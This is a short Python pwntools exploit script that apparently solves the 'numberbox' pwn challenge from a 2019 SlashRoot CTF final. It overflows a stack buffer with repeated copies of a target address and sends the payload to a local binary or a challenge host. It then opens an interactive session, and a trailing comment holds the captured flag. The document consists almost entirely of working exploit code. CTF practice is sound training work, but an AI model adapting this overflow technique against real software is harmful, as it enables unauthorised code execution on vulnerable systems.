#!/usr/bin/env python2
'''
    author : tripoloski 
    visit  : https://tripoloski1337.github.io/
    mail   : arsalan.dp@gmail.com
    generated by skeloski GEF
'''
import sys
from pwn import *
context.update(arch="amd64", endian="little", os="linux", log_level="info",)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("/home/tripoloski/code/ctf/slashroot2019-final/pwn/numberbox/numberbox")
elf = ELF(TARGET)

def un64(data):
    return int(data[::-1].encode("hex"),16)

def attach(r):
    if LOCAL:
        bkps = ['* 0x00000000004009f7']
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def exploit(r):
    #attach(r)
    waduh = 0x0000000000400796
    p = p64(waduh) * 21
    p += p64(waduh)
    r.sendline("4")
    r.sendlineafter("Who do you want to send this for?\n",p)
    r.sendline("\x00")
    log.info("leak : " + (str(r.recv().split())[0]))
    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("192.168.2.20", 60201)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)

'''
CXNuyTRfgClyoJTi
SlashRootCTF{05562c1ccf384f00dfef1b8a8f5c04cd}
'''